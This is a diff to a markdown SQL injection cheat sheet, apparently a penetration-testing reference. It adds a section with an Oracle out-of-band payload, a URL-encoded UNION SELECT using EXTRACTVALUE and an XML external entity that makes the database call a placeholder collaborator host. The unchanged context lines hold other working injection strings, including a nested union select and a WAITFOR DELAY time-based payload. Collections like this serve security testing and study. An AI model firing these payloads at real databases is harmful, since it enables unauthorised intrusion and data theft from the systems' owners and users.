@@ -26,6 +26,7 @@
 23. [HTTP Header Based SQL Injection](#http-header-based-sql-injection)
 24. [Inception Based SQL Injection](#inception-based-sql-injection)
 25. [Wordlist](#wordlist)
+26. [Out of band interaction](#Out-of-band-interaction)
 ___
 
 ### External Links for SQLi Techniques
@@ -358,3 +359,8 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
     ‘ WAITFOR DELAY ‘0:0:5’ —
 ```
 **Routed SQL Injection POC:** [Click...](https://youtu.be/mNj73yI8GEk?si=yuw2-_aGF0BjQuUk)
+
+### Out of band interaction
+```
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
